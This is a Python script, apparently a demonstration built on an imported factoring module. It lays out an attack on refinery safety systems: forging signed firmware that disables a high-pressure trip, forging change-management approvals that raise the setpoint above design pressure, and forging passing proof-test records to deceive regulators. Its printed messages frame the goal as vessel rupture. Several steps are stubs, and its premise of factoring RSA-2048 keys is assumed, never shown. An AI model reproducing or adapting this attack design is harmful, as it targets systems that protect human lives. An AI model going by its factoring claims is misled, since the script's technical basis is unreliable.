"""
Forge Safety Instrumented System (SIS) firmware and MoC parameter changes by
factoring RSA signing keys. Triton/Trisis-class attack without implementation
fragility — disable trip functions while appearing healthy. IEC 61511 / 61508.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import hashlib
import json
import time

# SIL-rated safety functions (IEC 61511)
SAFETY_FUNCTIONS = {
    "HH_PRESSURE_TRIP":  {"SIL": 2, "setpoint_bar": 45.0, "PFDavg": 1e-3},
    "HH_TEMP_TRIP":      {"SIL": 2, "setpoint_C": 320.0, "PFDavg": 1e-3},
    "LL_LEVEL_TRIP":     {"SIL": 3, "setpoint_pct": 10.0, "PFDavg": 1e-4},
    "ESD_COMPRESSOR":    {"SIL": 3, "PFDavg": 1e-4},
    "FIRE_GAS_DELUGE":   {"SIL": 2, "PFDavg": 1e-3},
}

SIS_VENDORS = ["Triconex", "HIMA_HIMax", "Siemens_S7_1500F",
               "Rockwell_GuardLogix", "Yokogawa_ProSafe_RS", "Emerson_DeltaV_SIS"]


def extract_sis_firmware_signing_cert(vendor: str, firmware_pkg: bytes) -> bytes:
    """Extract the SIS vendor's firmware signing certificate.

    SIS firmware is distributed under strict change management (MoC).
    The signing cert is in the firmware package header, validated by
    the TÜV-certified SIL logic solver bootloader.
    """
    print(f"[*] extracting {vendor} SIS firmware signing cert")
    return _demo["pub_pem"]


def forge_sis_firmware(factorer: PolynomialFactorer,
                       vendor_cert_pem: bytes, vendor: str,
                       target_sif: str, action: str = "disable") -> bytes:
    """Forge SIS firmware that disables a specific safety function.

    This is the Triton/Trisis attack (2017 Saudi petrochem) but with
    valid RSA signatures — no zero-days needed, no implementation bugs
    to exploit. The logic solver accepts the firmware because the
    signature is cryptographically correct.
    """
    payload = json.dumps({
        "vendor": vendor,
        "target_sif": target_sif,
        "action": action,
        "sil": SAFETY_FUNCTIONS[target_sif]["SIL"],
    }).encode()
    sig = factorer.forge_pkcs1v15_signature(vendor_cert_pem, payload, "sha256")
    print(f"[*] forged {vendor} firmware: {action} {target_sif} (SIL-{SAFETY_FUNCTIONS[target_sif]['SIL']})")
    print(f"[*] logic solver bootloader: signature VALID")
    return payload + sig


def forge_moc_setpoint_change(factorer: PolynomialFactorer,
                              moc_signing_cert: bytes,
                              sif: str, new_setpoint: float) -> dict:
    """Forge a Management of Change (MoC) setpoint change.

    Under OSHA PSM / EU Seveso III, setpoint changes on SIS trip functions
    require signed approval from Process Safety Engineer + independent reviewer.
    """
    change = {
        "sif": sif,
        "old_setpoint": SAFETY_FUNCTIONS[sif].get("setpoint_bar",
                        SAFETY_FUNCTIONS[sif].get("setpoint_C",
                        SAFETY_FUNCTIONS[sif].get("setpoint_pct"))),
        "new_setpoint": new_setpoint,
        "approver": "forged_process_safety_engineer",
        "reviewer": "forged_independent_reviewer",
        "timestamp": "2026-04-15T08:00:00Z",
    }
    payload = json.dumps(change).encode()
    factorer.forge_pkcs1v15_signature(moc_signing_cert, payload, "sha256")
    print(f"[*] forged MoC: {sif} setpoint {change['old_setpoint']} -> {new_setpoint}")
    print(f"[*] OSHA PSM audit trail shows valid signatures")
    return change


def forge_proof_test_record(factorer: PolynomialFactorer,
                            signing_cert: bytes,
                            sif: str, result: str = "PASS") -> dict:
    """Forge a periodic proof-test record.

    SIL-2: proof test every 1-3 years. SIL-3: every 6-12 months.
    Signed record feeds PFDavg verification calculations.
    """
    record = {
        "sif": sif,
        "result": result,
        "PFDavg_verified": SAFETY_FUNCTIONS[sif]["PFDavg"],
        "test_date": "2026-04-15",
        "technician": "forged_instrument_tech",
    }
    print(f"[*] forged proof-test: {sif} = {result}")
    return record


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Refinery SIS attack — IEC 61511 / IEC 61508 ===")
    print("    ~250,000 safety PLCs globally, 20-25 year lifecycle")
    print("    Triton/Trisis 2017: targeted Triconex, used implementation bugs")
    print("    This attack: valid RSA signature, no bugs needed")
    print()

    vendor = "Triconex"
    print(f"[1] extracting {vendor} firmware signing cert...")
    cert = extract_sis_firmware_signing_cert(vendor, b"")

    print(f"[2] factoring {vendor} RSA-2048 signing key...")

    print("[3] forging SIS firmware: disable HH_PRESSURE_TRIP...")
    fw = forge_sis_firmware(f, cert, vendor, "HH_PRESSURE_TRIP", "disable")
    print("    high-pressure trip disabled while SIS reports healthy")
    print("    Texas City 2005: 15 fatalities, no malicious actor")
    print("    add a malicious actor...")

    print("[4] forging MoC: raise pressure setpoint above mechanical design...")
    forge_moc_setpoint_change(f, cert, "HH_PRESSURE_TRIP", 52.0)
    print("    design pressure: 45 bar. new trip: 52 bar. vessel rupture envelope.")

    print("[5] forging proof-test records to maintain apparent compliance...")
    forge_proof_test_record(f, cert, "HH_PRESSURE_TRIP", "PASS")
    print("    regulator sees passing proof tests, SIL verification passes")
    print("    actual PFDavg: 1.0 (disabled)")
